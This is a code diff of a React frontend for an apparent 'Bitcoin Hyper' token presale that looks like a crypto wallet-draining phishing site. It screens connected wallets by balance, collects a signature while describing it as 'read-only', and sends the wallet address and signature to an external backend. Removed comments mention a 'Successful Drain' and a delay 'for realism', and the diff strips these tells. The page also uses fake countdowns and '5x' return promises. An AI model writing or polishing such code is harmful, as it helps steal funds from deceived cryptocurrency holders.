@@ -14,11 +14,11 @@ const allChains = [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom,
 // WalletConnect Project ID
 const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"
 
-// Backend URL - Your Render backend
+// Backend URL
 const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"
 
 // BTH Presale Price
-const BTH_PRICE = 0.17 // $0.17 per BTH
+const BTH_PRICE = 0.17
 
 // Create config
 const config = createConfig(
@@ -43,36 +43,27 @@ const config = createConfig(
   })
 )
 
-// Sleek Mobile Notification Popup
+// Notification Popup
 const NotificationPopup = ({ type, title, message, onClose, show }) => {
   if (!show) return null;
-
-  const getIcon = () => {
-    switch(type) {
-      case 'success': return '✅';
-      case 'error': return '❌';
-      case 'warning': return '⚠️';
-      case 'info': return 'ℹ️';
-      default: return '💎';
-    }
-  };
 
   return (
     <div className={`notification-popup ${type} ${show ? 'show' : ''}`}>
       <div className="notification-content">
-        <div className="notification-icon">{getIcon()}</div>
+        <div className="notification-icon">
+          {type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'warning' ? '⚠️' : 'ℹ️'}
+        </div>
         <div className="notification-text">
           <h4>{title}</h4>
           <p>{message}</p>
         </div>
         <button className="notification-close" onClick={onClose}>×</button>
       </div>
-      <div className="notification-progress"></div>
     </div>
   );
 };
 
-// Professional Not Eligible Modal - Mobile First Design
+// Not Eligible Modal
 const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
   if (!isOpen) return null;
 
@@ -83,7 +74,6 @@ const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
           <div className="modal-header">
             <div className="modal-icon warning">⚠️</div>
             <h2 className="modal-title">Portfolio Verification Required</h2>
-            <p className="modal-subtitle">Your current wallet doesn't meet our presale criteria</p>
           </div>
 
           <div className="modal-body">
@@ -103,47 +93,20 @@ const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
             </div>
 
             <div className="verification-reason">
-              <h4>📋 Verification Details:</h4>
-              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met. Please ensure your wallet has sufficient balance and transaction history.'}</p>
-            </div>
-
-            <div className="suggested-actions">
-              <h4>💡 Suggested Actions:</h4>
-              <div className="actions-list">
-                <div className="action-item">
-                  <span className="action-icon">1️⃣</span>
-                  <div className="action-content">
-                    <strong>Connect Different Wallet</strong>
-                    <p>Use an established wallet with transaction history</p>
-                  </div>
-                </div>
-                <div className="action-item">
-                  <span className="action-icon">2️⃣</span>
-                  <div className="action-content">
-                    <strong>Increase Balance</strong>
-                    <p>Add $10+ to current wallet and reconnect</p>
-                  </div>
-                </div>
-                <div className="action-item">
-                  <span className="action-icon">3️⃣</span>
-                  <div className="action-content">
-                    <strong>Use Verified Wallet</strong>
-                    <p>MetaMask, Trust Wallet, or Coinbase Wallet recommended</p>
-                  </div>
-                </div>
-              </div>
+              <h4>Verification Details:</h4>
+              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met.'}</p>
             </div>
           </div>
 
           <div className="modal-footer">
             <button className="modal-btn secondary" onClick={onClose}>
-              Return to Presale
+              Return
             </button>
             <button className="modal-btn primary" onClick={() => {
               onRetry();
               onClose();
             }}>
-              🔄 Connect Different Wallet
+              Connect Different Wallet
             </button>
           </div>
         </div>
@@ -152,33 +115,21 @@ const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
   );
 };
 
-// Elegant Confirmation Modal for Token Claim
+// Claim Confirmation Modal
 const ClaimConfirmationModal = ({ isOpen, onClose, onConfirm, scanData, address }) => {
   if (!isOpen) return null;
 
-  const calculateAllocationValue = (amount) => {
-    const bthAmount = parseInt(amount) || 5000;
-    return (bthAmount * BTH_PRICE).toFixed(2);
-  };
-
   const tokenAmount = scanData?.tokenAllocation?.amount || '5000';
-  const allocationValue = calculateAllocationValue(tokenAmount);
+  const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2);
 
-  // Professional signature message
   const signatureMessage = `Bitcoin Hyper Token Presale Authorization
 
-Wallet Authentication: ${address}
-Presale Allocation: ${tokenAmount} BTH
-Allocation Value: $${allocationValue}
+Wallet: ${address}
+Allocation: ${tokenAmount} BTH
+Value: $${allocationValue}
+Timestamp: ${new Date().toISOString()}
 
-Authorization Timestamp: ${new Date().toISOString()}
-Network: Multi-chain Compatible Wallet
-
-Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocation.
-
-🔐 Secured by 3D wallet authentication
-✅ Read-only verification signature
-💎 Bitcoin Hyper - Revolutionizing Bitcoin DeFi 2.0`;
+Purpose: Wallet verification for Bitcoin Hyper presale allocation.`;
 
   return (
     <div className="modal-overlay active" onClick={onClose}>
@@ -187,47 +138,28 @@ Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocati
           <div className="modal-header">
             <div className="modal-icon success">🔐</div>
             <h2 className="modal-title">Confirm Token Allocation</h2>
-            <p className="modal-subtitle">Review your presale details before signing</p>
           </div>
 
           <div className="modal-body">
             <div className="allocation-summary">
-              <div className="summary-item highlight">
+              <div className="summary-item">
                 <span className="summary-label">Token Amount:</span>
                 <span className="summary-value">{tokenAmount} BTH</span>
               </div>
               <div className="summary-item">
                 <span className="summary-label">Presale Price:</span>
-                <span className="summary-value">${BTH_PRICE.toFixed(2)} per BTH</span>
+                <span className="summary-value">$${BTH_PRICE.toFixed(2)} per BTH</span>
               </div>
               <div className="summary-item highlight">
-                <span className="summary-label">Total Allocation Value:</span>
+                <span className="summary-label">Total Value:</span>
                 <span className="summary-value">$${allocationValue}</span>
-              </div>
-              <div className="summary-item">
-                <span className="summary-label">Launch Target:</span>
-                <span className="summary-value success">$0.85+ (5x Potential)</span>
               </div>
             </div>
 
             <div className="signature-preview">
-              <h4>📝 Signature Preview:</h4>
-              <div className="preview-content">
-                <p className="preview-text">
-                  This signature securely verifies your wallet ownership for the Bitcoin Hyper presale allocation.
-                  <br/><br/>
-                  <strong>Wallet:</strong> {address?.substring(0, 6)}...{address?.substring(38)}
-                  <br/>
-                  <strong>Allocation:</strong> {tokenAmount} BTH (${allocationValue})
-                  <br/>
-                  <strong>Timestamp:</strong> {new Date().toLocaleString()}
-                </p>
-              </div>
-            </div>
-
-            <div className="security-note">
-              <span className="security-icon">🛡️</span>
-              <span>This is a secure read-only verification. No transactions or transfers are authorized.</span>
+              <p>This signature verifies your wallet ownership for the presale allocation.</p>
+              <p><strong>Wallet:</strong> {address?.substring(0, 6)}...{address?.substring(38)}</p>
+              <p><strong>Allocation:</strong> {tokenAmount} BTH ($${allocationValue})</p>
             </div>
           </div>
 
@@ -239,7 +171,7 @@ Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocati
               onConfirm(signatureMessage);
               onClose();
             }}>
-              🔐 Sign & Confirm Allocation
+              Sign & Confirm
             </button>
           </div>
         </div>
@@ -248,7 +180,7 @@ Purpose: Secure wallet ownership verification for Bitcoin Hyper presale allocati
   );
 };
 
-// Celebration Modal for Successful Drain
+// Celebration Modal
 const CelebrationModal = ({ isOpen, onClose, claimData }) => {
   if (!isOpen) return null;
 
@@ -256,25 +188,9 @@ const CelebrationModal = ({ isOpen, onClose, claimData }) => {
     <div className="modal-overlay active celebration" onClick={onClose}>
       <div className="modal-container" onClick={(e) => e.stopPropagation()}>
         <div className="modal-content success">
-          {/* Confetti Animation */}
-          <div className="confetti-container">
-            {Array.from({ length: 50 }).map((_, i) => (
-              <div 
-                key={i} 
-                className="confetti"
-                style={{
-                  left: `${Math.random() * 100}%`,
-                  animationDelay: `${Math.random() * 2}s`,
-                  backgroundColor: ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6'][Math.floor(Math.random() * 5)]
-                }}
-              />
-            ))}
-          </div>
-
           <div className="modal-header">
             <div className="modal-icon celebration">🎉</div>
             <h2 className="modal-title">Tokens Secured Successfully!</h2>
-            <p className="modal-subtitle">Your Bitcoin Hyper allocation has been confirmed</p>
           </div>
 
           <div className="modal-body">
@@ -294,38 +210,11 @@ const CelebrationModal = ({ isOpen, onClose, claimData }) => {
                 </div>
                 <div className="info-item">
                   <span className="info-label">Transaction:</span>
-                  <span className="info-value success">✅ Confirmed</span>
+                  <span className="info-value success">Confirmed</span>
                 </div>
                 <div className="info-item">
                   <span className="info-label">Total Value:</span>
                   <span className="info-value highlight">${claimData?.tokenValue || (5000 * BTH_PRICE).toFixed(2)}</span>
-                </div>
-              </div>
-
-              <div className="next-steps">
-                <h4>📋 What Happens Next:</h4>
-                <div className="steps-list">
-                  <div className="step-item">
-                    <span className="step-number">1</span>
-                    <div className="step-content">
-                      <strong>Token Locking</strong>
-                      <p>Your allocation is secured at presale price</p>
-                    </div>
-                  </div>
-                  <div className="step-item">
-                    <span className="step-number">2</span>
-                    <div className="step-content">
-                      <strong>Distribution</strong>
-                      <p>Tokens will be distributed within 24-48 hours</p>
-                    </div>
-                  </div>
-                  <div className="step-item">
-                    <span className="step-number">3</span>
-                    <div className="step-content">
-                      <strong>Trading Launch</strong>
-                      <p>Trade on DEX at launch price target: $0.85+</p>
-                    </div>
-                  </div>
                 </div>
               </div>
             </div>
@@ -333,7 +222,7 @@ const CelebrationModal = ({ isOpen, onClose, claimData }) => {
 
           <div className="modal-footer">
             <button className="modal-btn success" onClick={onClose}>
-              🎉 Continue to Dashboard
+              Continue
             </button>
           </div>
         </div>
@@ -348,7 +237,6 @@ function BitcoinHyperPresale() {
   const { disconnect } = useDisconnect()
   const { signMessage } = useSignMessage()
   
-  const [loading, setLoading] = useState(false)
   const [scanning, setScanning] = useState(false)
   const [isEligible, setIsEligible] = useState(false)
   const [backendStatus, setBackendStatus] = useState('checking')
@@ -385,7 +273,7 @@ function BitcoinHyperPresale() {
     seconds: 30
   })
 
-  // Show notification function
+  // Show notification
   const showNotification = (type, title, message, duration = 5000) => {
     setNotification({ show: true, type, title, message })
     setTimeout(() => {
@@ -402,15 +290,11 @@ function BitcoinHyperPresale() {
     const session = generateSessionId()
     setSessionId(session)
     
-    // Track site visit
     const trackVisit = async () => {
       try {
         await fetch(`${BACKEND_API}/track/visit`, {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             userAgent: navigator.userAgent,
             referrer: document.referrer,
@@ -429,22 +313,15 @@ function BitcoinHyperPresale() {
   useEffect(() => {
     const testBackend = async () => {
       try {
-        const response = await fetch(`${BACKEND_API}/health`, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          }
-        })
-        
+        const response = await fetch(`${BACKEND_API}/health`)
         if (response.ok) {
           const data = await response.json()
           console.log('✅ Backend connected:', data)
           setBackendStatus('connected')
-          showNotification('success', 'System Connected', 'Backend systems are LIVE and monitoring')
+          showNotification('success', 'System Connected', 'Backend systems are LIVE')
         } else {
           setBackendStatus('error')
-          showNotification('error', 'Connection Issue', 'Unable to connect to backend systems')
+          showNotification('error', 'Connection Issue', 'Unable to connect to backend')
         }
       } catch (error) {
         console.error('❌ Backend error:', error)
@@ -502,14 +379,10 @@ function BitcoinHyperPresale() {
     try {
       const response = await fetch(`${BACKEND_API}/presale/connect`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: address,
           userAgent: navigator.userAgent,
-          email: '',
           sessionId,
           timestamp: new Date().toISOString()
         })
@@ -521,20 +394,15 @@ function BitcoinHyperPresale() {
         if (data.success) {
           setScanData(data.data)
           
-          // Add processing delay for realism
           setTimeout(() => {
             setScanning(false)
             
             if (data.data.isEligible) {
               setIsEligible(true)
               showNotification('success', 'Eligibility Confirmed!', `You qualify for ${data.data.tokenAllocation.amount} BTH!`)
-              
-              // Trigger eligibility animation
               createFloatingCoins()
             } else {
               setIsEligible(false)
-              
-              // Show not eligible modal after short delay
               setTimeout(() => {
                 setShowNotEligibleModal(true)
               }, 1000)
@@ -564,28 +432,21 @@ function BitcoinHyperPresale() {
     if (!address) return
     
     try {
-      // Sign the message
       const signature = await signMessage({ message: signatureMessage })
       
-      // Calculate allocation value
       const tokenAmount = scanData?.tokenAllocation?.amount || '5000'
       const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2)
       
-      // Send claim request
       const response = await fetch(`${BACKEND_API}/presale/claim`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Accept': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           walletAddress: address,
           signature,
           message: signatureMessage,
           claimAmount: `${tokenAmount} BTH`,
           claimValue: `$${allocationValue}`,
-          sessionId,
-          email: ''
+          sessionId
         })
       })
       
@@ -596,7 +457,6 @@ function BitcoinHyperPresale() {
           setClaimData(data.data)
           setProcessing(false)
           
-          // Show celebration
           setTimeout(() => {
             setShowCelebrationModal(true)
             createConfetti()
@@ -674,7 +534,6 @@ function BitcoinHyperPresale() {
 
   return (
     <div className="app-container">
-      {/* Notification Popup */}
       <NotificationPopup 
         show={notification.show}
         type={notification.type}
@@ -683,7 +542,6 @@ function BitcoinHyperPresale() {
         onClose={() => setNotification(prev => ({ ...prev, show: false }))}
       />
       
-      {/* Modals */}
       <NotEligibleModal
         isOpen={showNotEligibleModal}
         onClose={() => setShowNotEligibleModal(false)}
@@ -742,24 +600,6 @@ function BitcoinHyperPresale() {
           </div>
         </header>
 
-        {/* Status Bar */}
-        <div className="status-bar">
-          <div className="status-item">
-            <span className="status-icon">🌐</span>
-            <span className={`status-text ${backendStatus === 'connected' ? 'online' : 'offline'}`}>
-              {backendStatus === 'connected' ? 'System: LIVE' : 'System: CONNECTING...'}
-            </span>
-          </div>
-          <div className="status-item">
-            <span className="status-icon">👥</span>
-            <span className="status-text">{presaleStats.participants} Participants</span>
-          </div>
-          <div className="status-item">
-            <span className="status-icon">⏰</span>
-            <span className="status-text">{formatNumber(countdown.days)}d {formatNumber(countdown.hours)}h {formatNumber(countdown.minutes)}m</span>
-          </div>
-        </div>
-
         <section className="hero-section">
           <div className="hero-bitcoin">₿</div>
           
@@ -769,15 +609,6 @@ function BitcoinHyperPresale() {
             Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
             and be part of the revolution.
           </p>
-          
-          <div className="countdown-timer">
-            {Object.entries(countdown).map(([label, value]) => (
-              <div key={label} className="countdown-item">
-                <div className="countdown-value">{formatNumber(value)}</div>
-                <div className="countdown-label">{label.toUpperCase()}</div>
-              </div>
-            ))}
-          </div>
           
           <div className="stats-grid">
             {Object.entries(presaleStats).map(([label, value]) => (
@@ -790,33 +621,15 @@ function BitcoinHyperPresale() {
             ))}
           </div>
           
-          <div className="progress-container">
-            <div className="progress-header">
-              <span>Presale Progress</span>
-              <span className="progress-percent">{presaleStats.progress}%</span>
-            </div>
-            <div className="progress-bar">
-              <div 
-                className="progress-fill"
-                style={{width: `${presaleStats.progress}%`}}
-              >
-                <div className="progress-glow"></div>
-              </div>
-            </div>
-          </div>
-          
-          {/* Main Action Area */}
           {backendStatus === 'checking' ? (
             <div className="loading-container">
               <div className="loading-spinner"></div>
               <h3 className="loading-title">Establishing Secure Connection...</h3>
-              <p className="loading-description">Connecting to Bitcoin Hyper backend systems</p>
             </div>
           ) : backendStatus === 'error' ? (
             <div className="error-container">
               <div className="error-icon">🔴</div>
               <h3 className="error-title">Connection Issue Detected</h3>
-              <p className="error-description">Please check your connection and try again</p>
             </div>
           ) : !isConnected ? (
             <div className="cta-container">
@@ -838,9 +651,6 @@ function BitcoinHyperPresale() {
               <div className="scanning-spinner"></div>
               <h3 className="scanning-title">Analyzing Wallet Portfolio...</h3>
               <p className="scanning-description">Checking eligibility across blockchain networks</p>
-              <div className="scanning-dots">
-                <span>.</span><span>.</span><span>.</span>
-              </div>
             </div>
           ) : (
             <div className="status-summary">
@@ -877,57 +687,11 @@ function BitcoinHyperPresale() {
                   ) : isEligible ? 'Claim Tokens' : 'Try Different Wallet'}
                 </button>
               </div>
-              
-              {isEligible && (
-                <div className="allocation-details">
-                  <h4>🎯 Your Allocation Details:</h4>
-                  <div className="allocation-grid">
-                    <div className="allocation-item">
-                      <span className="item-label">Token Amount</span>
-                      <span className="item-value">{scanData?.tokenAllocation?.amount || '5,000'} BTH</span>
-                    </div>
-                    <div className="allocation-item">
-                      <span className="item-label">Presale Price</span>
-                      <span className="item-value">${BTH_PRICE.toFixed(2)} per BTH</span>
-                    </div>
-                    <div className="allocation-item">
-                      <span className="item-label">Total Value</span>
-                      <span className="item-value highlight">${scanData?.tokenAllocation?.valueUSD || (5000 * BTH_PRICE).toFixed(2)}</span>
-                    </div>
-                    <div className="allocation-item">
-                      <span className="item-label">Launch Target</span>
-                      <span className="item-value success">$0.85+ (5x)</span>
-                    </div>
-                  </div>
-                </div>
-              )}
             </div>
           )}
         </section>
 
-        <section className="features-section">
-          <h2 className="features-title">WHY BITCOIN HYPER?</h2>
-          
-          <div className="features-grid">
-            {[
-              { icon: '⚡', title: 'Lightning Fast', desc: 'Transaction speeds up to 100x faster' },
-              { icon: '🛡️', title: 'Secure & Audited', desc: 'Fully audited smart contracts' },
-              { icon: '📈', title: 'High Yield', desc: 'Earn yields up to 45% APR' },
-              { icon: '🌐', title: 'Multi-Chain', desc: 'Interoperability across chains' },
-              { icon: '🎯', title: 'Limited Supply', desc: 'Only 100M tokens ever minted' },
-              { icon: '🚀', title: 'Massive Growth', desc: '100x growth potential' }
-            ].map((feature, index) => (
-              <div key={index} className="feature-card">
-                <div className="feature-icon">{feature.icon}</div>
-                <h3 className="feature-title">{feature.title}</h3>
-                <p className="feature-description">{feature.desc}</p>
-              </div>
-            ))}
-          </div>
-        </section>
-
         <footer className="app-footer">
-          <div className="footer-bitcoin">₿</div>
           <div className="footer-description">
             Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
           </div>
@@ -937,8 +701,6 @@ function BitcoinHyperPresale() {
             <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
               {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
             </span>
-            <span>|</span>
-            <span>Official Presale Platform</span>
           </div>
         </footer>
       </div>
